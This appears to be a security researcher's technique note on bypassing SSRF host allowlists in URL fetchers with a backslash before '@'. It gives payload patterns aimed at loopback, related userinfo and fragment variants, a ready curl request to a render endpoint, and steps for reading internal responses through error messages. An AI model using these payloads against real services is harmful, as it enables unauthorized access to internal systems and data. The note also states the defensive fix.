# SSRF Backslash Userinfo Allowlist Bypass

## Date

2026-07-10

## Target Type

Server-side URL fetchers (image renderers, previews, unfurlers) with host/domain allowlists

## Bug Class

SSRF via allowlist vs executor parser confusion using backslash before `@`

## Initial Signal

- Fetcher rejects `http://127.0.0.1:...` with “must be from [allowed-domain]”
- Upload/render pipelines that re-fetch a URL the client supplies
- Errors that include upstream Content-Type and response body

## Pattern

```text
http://127.0.0.1:[port]\[@][allowed-host]/
```

Example shape:

```text
http://127.0.0.1:1337\@app.allowed.example/
```

What layers see (typical):

| Layer | Host / decision |
|-------|-----------------|
| String/host allowlist | still matches `allowed.example` |
| HTTP stack | connects to `127.0.0.1:port` |

Related but distinct:

| Technique | Example |
|-----------|---------|
| Userinfo | `allowed@127.0.0.1` |
| Fragment substring | `http://127.0.0.1/#https://allowed/` |
| Backslash + `@` | `http://127.0.0.1\@allowed/` |

Test all three; one may work when others are blocked.

## Trust Boundary

URL policy must use the same parser the client uses, after normalization. Raw-string “contains allowed domain” checks are not a trust boundary.

## Minimal Reproduction

1. Confirm allowlist error on plain loopback.
2. Confirm normal allowed-host fetch works.
3. Try backslash-`@` with allowed domain in the trailing authority token.
4. If Content-Type is wrong, read the error oracle for the internal body.
5. Enumerate internal paths only if the root response is not enough.

```bash
curl -sS -X POST "https://[host]/api/render" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:[port]\\@[allowed-host]/"}'
```

## Why Failed Tests Fail

- Allowlist uses parsed `hostname` after a strict URL parse.
- Backslash rejected or normalized away before the check.
- Loopback blocked post-DNS regardless of host string.
- No response reflection (blind SSRF).

## Why Working Tests Work

Validator and executor disagree on authority when `\` appears before `@`, and the app reflects non-image upstream bodies in errors.

## Common Mistake

Stopping after fragment and classic userinfo fail, without testing backslash and mixed-slash authority forms.

## Drill

For an allowlist message `URL must be from example.com`, list five payloads that keep `example.com` in the string but may hit `127.0.0.1:1337`, including at least one with `\`.

## Checklist Update

When allowlist SSRF is present:

- [ ] Fragment substring
- [ ] Classic userinfo both orders (`allowed@ip`, `ip@allowed`)
- [ ] Backslash before `@`
- [ ] Encoded `@` / `%5c`
- [ ] Error-body oracle for non-expected Content-Type

## Related Files

- `writeups/asciisnap-backslash-userinfo-allowlist-ssrf.md`
- `payloads/ssrf/backslash-at-allowlist-loopback-bypass.md`
- `notes/ssrf-substring-allowlist-fragment-bypass.md`
- `checklists/ssrf-parser-confusion.md`
